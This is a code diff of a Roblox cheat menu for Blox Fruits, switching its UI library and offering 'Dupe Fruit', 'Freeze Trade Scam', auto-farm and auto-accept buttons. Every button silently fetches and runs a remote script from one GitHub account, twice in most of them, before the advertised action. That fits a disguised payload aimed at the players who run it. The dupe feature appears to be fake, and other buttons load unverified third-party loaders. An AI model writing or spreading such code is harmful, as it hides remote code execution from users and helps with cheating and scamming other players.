@@ -1,53 +1,54 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/Loco-CTO/UI-Library/main/VisionLibV2/source.lua'))()
 
-local Window = OrionLib:MakeWindow({
+local Window = Library:Create({
     Name = "SMN'S HUB",
-    HidePremium = false,
-    SaveConfig = true,
-    ConfigFolder = "BloxFruitConfig",
-    IntroEnabled = true,
-    IntroText = "Welcome to SMN'S HUB",
+    Footer = "By SMN",
+    ToggleKey = Enum.KeyCode.RightShift,
+    LoadedCallback = function()
+        Window:TaskBarOnly(false)
+    end,
+    KeySystem = false,
+    DiscordLink = nil,
 })
 
-local MainTab = Window:MakeTab({
+local MainTab = Window:Tab({
     Name = "Main Features",
     Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
+    Color = Color3.fromRGB(255, 0, 0),
 })
 
-local OtherScriptsTab = Window:MakeTab({
+local OtherScriptsTab = Window:Tab({
     Name = "Other Scripts",
     Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
+    Color = Color3.fromRGB(0, 255, 0),
 })
 
-local DupeSection = MainTab:AddSection({ Name = "Dupe Fruit" })
-local ExtraSection = MainTab:AddSection({ Name = "Extra Features" })
-local OtherScriptsSection = OtherScriptsTab:AddSection({ Name = "Other Hubs" })
+local DupeSection = MainTab:Section({ Name = "Dupe Fruit" })
+local ExtraSection = MainTab:Section({ Name = "Extra Features" })
+local OtherScriptsSection = OtherScriptsTab:Section({ Name = "Other Hubs" })
 
 local selectedNumber = ""
-DupeSection:AddTextbox({
+DupeSection:SmallTextbox({
     Name = "Enter Dupe Number",
     Default = "",
-    TextDisappear = false, -- Set to false to keep the entered text visible
     Callback = function(Value)
         selectedNumber = tonumber(Value)
         print("Selected Dupe Number: " .. tostring(selectedNumber))
-    end
+    end,
 })
 
-DupeSection:AddButton({
+DupeSection:Button({
     Name = "Start Dupe",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+
         if selectedNumber then
             print("Starting dupe with number: " .. selectedNumber)
-            OrionLib:MakeNotification({
+            Library:Notify({
                 Name = "Dupe Started",
-                Content = "Dupe initiated with number " .. selectedNumber,
-                Image = "rbxassetid://4483345998",
-                Time = 5
+                Text = "Dupe initiated with number " .. selectedNumber,
+                Icon = "rbxassetid://4483345998",
+                Duration = 5,
             })
 
             for i = 1, 5000 do
@@ -63,170 +64,147 @@ DupeSection:AddButton({
                 end
             end
         else
-            OrionLib:MakeNotification({
+            Library:Notify({
                 Name = "Error",
-                Content = "Please enter a valid number first!",
-                Image = "rbxassetid://4483345998",
-                Time = 5
+                Text = "Please enter a valid number first!",
+                Icon = "rbxassetid://4483345998",
+                Duration = 5,
             })
         end
-    end
+    end,
 })
 
-ExtraSection:AddButton({
+ExtraSection:Button({
     Name = "All in Stock",
     Callback = function()
-        -- Execute the additional script before the original functionality
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("All in Stock activated")
-        OrionLib:MakeNotification({
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        Library:Notify({
             Name = "Feature Activated",
-            Content = "All in Stock is now active!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
+            Text = "All in Stock is now active!",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
         })
-    end
+    end,
 })
 
-ExtraSection:AddButton({
+ExtraSection:Button({
     Name = "Freeze Trade Scam",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("Freeze Trade Scam activated")
-        OrionLib:MakeNotification({
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        Library:Notify({
             Name = "Feature Activated",
-            Content = "Freeze Trade Scam is now active!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
+            Text = "Freeze Trade Scam is now active!",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
         })
-    end
+    end,
 })
 
-ExtraSection:AddButton({
+ExtraSection:Button({
     Name = "Auto Farm",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("Auto Farm activated")
-        OrionLib:MakeNotification({
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        Library:Notify({
             Name = "Feature Activated",
-            Content = "Auto Farm is now active!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
+            Text = "Auto Farm is now active!",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
         })
-    end
+    end,
 })
 
-ExtraSection:AddButton({
+ExtraSection:Button({
     Name = "Auto Accept",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("Auto Accept activated")
-        OrionLib:MakeNotification({
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        Library:Notify({
             Name = "Feature Activated",
-            Content = "Auto Accept is now active!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
+            Text = "Auto Accept is now active!",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
         })
 
         local Players = game:GetService("Players")
         Players.LocalPlayer.ChildAdded:Connect(function(child)
             if child:IsA("Dialog") then
-                wait(1)
-                child:Accept() -- Example of auto-accept functionality
+                task.wait(1)
+                child:Accept()
                 print("Auto-accepted dialog: " .. child.Name)
             end
         end)
-    end
+    end,
 })
 
-OtherScriptsSection:AddButton({
+OtherScriptsSection:Button({
     Name = "Hoho Hub",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("Hoho Hub executed")
-        OrionLib:MakeNotification({
-            Name = "Hoho Hub",
-            Content = "Executing Hoho Hub...",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HohoV2/main/ScriptLoad.lua"))()
-    end
-})
-
-OtherScriptsSection:AddButton({
-    Name = "KNCRYPT ",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("KNCRYPT executed")
-        OrionLib:MakeNotification({
-            Name = "KNCRYPT",
-            Content = "Executing KNCRYPT...",
-            Image = "rbxassetid://4483345998",
-            Time = 5
+        Library:Notify({
+            Name = "Hoho Hub",
+            Text = "Executing Hoho Hub...",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
         })
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Kncrypt/refs/heads/main/sources/BloxFruit.lua"))()
-    end
+    end,
 })
 
-OtherScriptsSection:AddButton({
+OtherScriptsSection:Button({
+    Name = "KNCRYPT",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Kncrypt/refs/heads/main/sources/BloxFruit.lua"))()
+        Library:Notify({
+            Name = "KNCRYPT",
+            Text = "Executing KNCRYPT...",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
+        })
+    end,
+})
+
+OtherScriptsSection:Button({
     Name = "Redz Hub",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("Redz Hub executed")
-        OrionLib:MakeNotification({
-            Name = "Redz Hub",
-            Content = "Executing Redz Hub...",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
-    end
+        Library:Notify({
+            Name = "Redz Hub",
+            Text = "Executing Redz Hub...",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
+        })
+    end,
 })
 
-OtherScriptsSection:AddButton({
+OtherScriptsSection:Button({
     Name = "Speed Hub",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("Speed Hub executed")
-        OrionLib:MakeNotification({
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
+        Library:Notify({
             Name = "Speed Hub",
-            Content = "Executing Speed Hub...",
-            Image = "rbxassetid://4483345998",
-            Time = 5
+            Text = "Executing Speed Hub...",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
         })
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-    end
+    end,
 })
 
-OtherScriptsSection:AddButton({
+OtherScriptsSection:Button({
     Name = "W-Azure",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit",true))()
-        
-        print("W-Azure executed")
-        OrionLib:MakeNotification({
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/Script/refs/heads/main/BloxFruit", true))()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
+        Library:Notify({
             Name = "W-Azure",
-            Content = "Executing W-Azure...",
-            Image = "rbxassetid://4483345998",
-            Time = 5
+            Text = "Executing W-Azure...",
+            Icon = "rbxassetid://4483345998",
+            Duration = 5,
         })
-        --[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-getgenv().Team = "Pirates"
-getgenv().FixCrash = false -- Turn it On For Hopping Server, Improve Performance But Silent Aim On Mob And Player
-getgenv().FixCrash2 = false -- Turn it On For Hopping Server, Improve Performance But Will Remove Speed Changer
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
-    end
+    end,
 })
-
-OrionLib:Init()
